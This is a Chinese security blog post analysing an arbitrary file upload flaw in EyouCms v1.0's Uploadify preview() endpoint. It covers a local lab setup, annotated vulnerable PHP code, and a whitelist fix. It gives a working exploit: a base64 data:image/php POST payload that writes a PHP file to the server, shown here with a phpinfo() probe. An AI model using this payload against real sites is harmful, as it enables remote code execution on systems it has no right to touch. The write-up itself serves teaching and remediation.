<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HjQfTES5hFkT06XQdqV-Jw)

<table width="657" style="visibility: visible;"><tbody style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><tr style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td width="557" valign="top" height="62" style="margin: 0px;padding: 5px 10px;outline: 0px;word-break: break-all;hyphens: auto;border-width: 1px;border-style: solid;border-color: rgb(221, 221, 221);max-width: 100%;visibility: visible;overflow-wrap: break-word !important;box-sizing: border-box !important;"><section style="margin: 0px 0px 15px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><strong style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系刘一手。</section><section style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

### 框架简介

EyouCms是一个自由和开放源码的内容管理系统，它是一个可以独立使用的内容发布系统（CMS）

### 环境搭建

EyouCms v1.0 源码、phpstudy 

在phpstudy新建一个网站（需要把源码放在网站根目录）![图片](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyMIMbGJKDSE6ib8ibGicic0auSwGFgicKticaCQCPHr7cRUEjVeWOhNXsHzRQ9qRcl0LjuYyqxpk2Vt9gJQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)将源码下载下来解压放在eyoucms目录下![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)浏览器输入http://127.0.0.1:7000进行安装 安装好的前台界面![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 漏洞点

eyoucms是基于thinkphp5开发的，所以

**漏洞出现的位置****是****：**application\api\controller\Uploadify.php

**漏洞函数是****：**preview()

**data:image：**将dataurl转成图片image方法。可以利用改方法把恶意代码进行base64编码传入（不只是可以传入图片，还可以传入其他）

```
例如：传入<?php phpinfo();?>  
data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+  

```

### 存在漏洞的代码如下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
代码解析

```
$src = file_get_contents('php://input'); //使用php伪协议进行写入  
//正则获取是否是图片base64编码数据， data:image/php;base64就可以绕过这个正则.$matches被赋值为搜索出来的结果  
if (preg_match("#^data:image/(\w+);base64,(.*)$#", $src, $matches)) {         
  $previewUrl = sprintf(  
    "%s://%s%s",  
    isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',  
    $_SERVER['HTTP_HOST'],$_SERVER['REQUEST_URI']  
  );  
    
  $previewUrl = str_replace("preview.php", "", $previewUrl);//获取路径  
  $base64 = $matches[2]; //获取base64数据  
  $type = $matches[1]; //获取base64后缀,此时的后缀是php  
  if ($type === 'jpeg') { //if语句进行判断，如果此时后缀是jpeg则后缀变为jpg，但是如果后缀是php，那后缀还是php,后缀名可以被外部控制  
    $type = 'jpg';  
  }  
    
  $filename = md5($base64).".$type";  // 将传入的base64进行md5加密形成文件名，$type变量 也就是后缀名 这里我们可以控制  
  $filePath = $DIR.DIRECTORY_SEPARATOR.$filename; //文件存放的位置，也就是preveiw/文件名  
    
  if (file_exists($filePath)) { // 判断文件是否存在，存在则返回存在的路径  
    die('{"jsonrpc" : "2.0", "result" : "'.$previewUrl.'preview/'.$filename.'", "id" : "id"}');  
  } else {  
    $data = base64_decode($base64);  //不存在则进行base64解密，比如写入的是PD9waHAgcGhwaW5mbygpOz8+，则进行base64解密:<?php phpinfo();?>  
    file_put_contents($filePath, $data); //写入文件，生成文件  
    die('{"jsonrpc" : "2.0", "result" : "'.$previewUrl.'preview/'.$filename.'", "id" : "id"}');  
            }  

```

利用
--

输入：http://192.168.0.104:7000/index.php/api/Uploadify/preview

如果返回如下界面，则可能存在漏洞![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

构造写入 首先进行base64编码：PD9waHAgcGhwaW5mbygpOz8+ 

在线编码平台https://base64.us/![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)post传入：data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+ 

这里是用的burp进行抓包![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)浏览器中:

http://192.168.0.104:7000/preview/5f38ff3c8c94a7347e0ff5b0c1fb0512.php![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

python进行漏洞验证
------------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
-----------------------------------------------------------------------------------------------------------------------------

修复方法
----

设置黑白名单 列如：设置白名单

```
if (!in_array($type, array('jpg', 'png', 'jpeg', 'gif'), true)) {  
   exit;  
}
```

* * *

**欢 迎 加入学习**

  

  

  

  

机器人md5解密丫

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**推 荐 阅 读**

  

  

  

  

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247486916&idx=1&sn=984c77b45bd8cd9d4c18e6d4e48f7a77&chksm=c01cc154f76b4842794057c17d6d4d2b53d511086f7a1b2179f18b013ecb10d0130b11e21b30&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247484227&idx=1&sn=9a75c274d878cff798b7939bbde81cc6&chksm=c01ccfd3f76b46c56fd931ef3298b890ad38c11a292e8a8e5925399177535798e1bf57aabbe6&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247486647&idx=1&sn=1bff4578d5a5be7f2b61256ed936bf87&chksm=c01cc027f76b4931bea1c2da2de5c2efc81198b2a592c11c69cf12bf46a4ec77ff4de2aac74a&scene=21#wechat_redirect)